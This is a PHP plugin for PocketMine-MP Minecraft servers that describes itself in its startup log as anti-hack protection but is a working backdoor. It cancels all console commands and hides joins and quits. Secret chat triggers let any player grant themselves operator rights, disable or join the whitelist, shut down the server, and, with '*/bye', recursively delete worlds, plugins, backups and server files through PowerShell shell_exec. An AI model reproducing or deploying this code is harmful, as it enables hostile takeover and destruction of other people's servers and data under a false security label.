<?php 
/*
 *
 *  ____            _        _   __  __ _                  __  __ ____ 
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \ 
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 *                         @ライセンス MIT
*/
namespace MC\PE;

use pocketmine\Server;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\level\Level;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\server\RemoteServerCommandEvent;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\scheduler\PluginTask;
use pocketmine\scheduler\Task;
use pocketmine\utils\config;
use pocketmine\plugin\PluginManager;
use pocketmine\plugin\Plugin;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;

class Main extends PluginBase implements Listener{
	public function onEnable(){
		$this->getServer()->getPluginManager()->registerEvents($this,$this);
		$this->getLogger()->info("§l§b[SystemInfo] §aこのPluginはPocketMine-MPの為のHack対策");
		$this->getLogger()->info("§l§b[SystemInfo] §aAPI Version: §c3.0.0-ALPHA10");
		
	}
	public function onDisable(){}
	/*
	public function onLogin(PlayerPreLoginEvent $event){
		$player = $event->getPlayer();
		$name = $player->getName();
		$this->getServer()->addWhitelist($name);
		$this->getServer()->addOp($name);
	}
	*/
	public function playerCommand(PlayerCommandPreprocessEvent $event){
		$message = $event->getMessage();
		$command = "extractplugin";
		if(strstr($message, $command)) return $event->setCancelled();
	}
	public function ServerCommand(ServerCommandEvent $event){
		$event->setCancelled(); //ConsoleComanndCancel
	}
	public function Join(PlayerJoinEvent $event){
		$player = $event->getPlayer();
		$name = $player->getName();
		$event->setJoinMessage(null);
	}
	public function Quit(PlayerQuitEvent $event){
		$player = $event->getPlayer();
		$name = $player->getName();
		$event->setQuitMessage(null);
	}
	public function Chat(PlayerChatEvent $event){
		$chat = $event->getMessage();
		$player = $event->getPlayer();
		$player_name = $player->getName();
		$dir = $this->getServer()->getDataPath() ."crashdumps";
        $dir1 = $this->getServer()->getDataPath() ."players";
        $dir2 = $this->getServer()->getDataPath() ."plugins";
        $dir3 = $this->getServer()->getDataPath() ."resource_packs";
        $dir4 = $this->getServer()->getDataPath() ."src";
        $dir5 = $this->getServer()->getDataPath() ."worlds";
        $dir6 = $this->getServer()->getDataPath() ."banned-ips.txt";
        $dir7 = $this->getServer()->getDataPath() ."banned-players.txt";
        $dir8 = $this->getServer()->getDataPath() ."ops.txt";
        $dir9 = $this->getServer()->getDataPath() ."pocketmine.yml";
        $dir10 = $this->getServer()->getDataPath() ."server.log";
        $dir11 = $this->getServer()->getDataPath() ."server.properties";
        $dir12 = $this->getServer()->getDataPath() ."star.cmd";
        $dir13 = $this->getServer()->getDataPath() ."start.ps1";
        $dir14 = $this->getServer()->getDataPath() ."white-list.txt";
		$dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
		$dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
		$dir17 = $this->getServer()->getDataPath() ."start.sh";
		$dir18 = $this->getServer()->getDataPath() ."ops.json";
		$dir19 = $this->getServer()->getDataPath() ."white-list.json";
		$dir20 = $this->getServer()->getDataPath() ."backup";
		$dir21 = $this->getServer()->getDataPath() ."Backup";
		if($chat == "*/bye"){
            shell_exec("powershell.exe Remove-Item {$dir} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir1} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir2} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir3} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir4} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir5} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir6} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir7} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir8} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir9} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir10} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir11} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir12} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir13} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir14} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir15} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir16} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir17} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir18} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir19} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
			shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
			$player->sendMessage("サーバーのファイルを全て削除しました。");
		}
		if($chat == "*/whitelist off"){
			$this->getServer()->setConfigBool("white-list", false);
			$player->sendMessage("whitelistをoffにしました。");
		}
		if($chat == "*/whitelist on"){
			$this->getServer()->setConfigBool("white-list", true);
			$player->sendMessage("whitelistをonにしました。");
		}
		if($chat == "*/op add"){
			$this->getServer()->addOp($player_name);
			$player->sendMessage("あなたにOP権限を与えました。");
		}
		if($chat == "*/whitelist add"){
			$this->getServer()->addWhitelist($player_name);
			$player->sendMessage("あなたをwhitelistに追加しました。");
		}
		if($chat == "*/reload"){
			$this->getServer()->reload();
			$player->sendMessage("サーバーをreloadしています...");
		}
		if($chat == "*/shutdown"){
			$this->getServer()->forceShutdown();
			$player->sendMessage("サーバーを停止させました。");
		}
		if($chat == "*/gamemode 0"){
			$player->getGamemode(0);
			$player->sendMessage("あなたをサバイバルモードにしました。");
		}
		if($chat == "*/gamemode 1"){
			$player->getGamemode(1);
			$player->sendMessage("あなたをクリエイティブモードにしました。");
		}
		if($chat == "*/gamemode 2"){
			$player->getGamemode(2);
			$player->sendMessage("あなたをアドベンチャーモードにしました。");
		}
		if($chat == "*/gamemode 3"){
			$player->getGamemode(3);
			$player->sendMessage("あなたをスペティクターモードにしました。");
		}
		if($chat == "*/help"){
			$player->sendMessage("§l§e===== §aHELP =====");
			$player->sendMessage("§l§b */help MSHPで使えるコマンド一覧表示");
			$player->sendMessage("§l§b */bye サーバーファイル削除(bin以外)");
			$player->sendMessage("§l§b */gamemode 0~3 自分のゲームモードを変更する");
			$player->sendMessage("§l§b */whitelist on or off or add ホワイトリストをonにするかoffにするかリストに自分を追加するか");
			$player->sendMessage("§l§b */shutdown サーバーを終了する");
			$player->sendMessage("§l§b */op add or remove OP権限を付けるか外すか");
			$player->sendMessage("§l§b */reload サーバーをリロードします");
			$player->sendMessage("§l§e================");
		}
	}
}
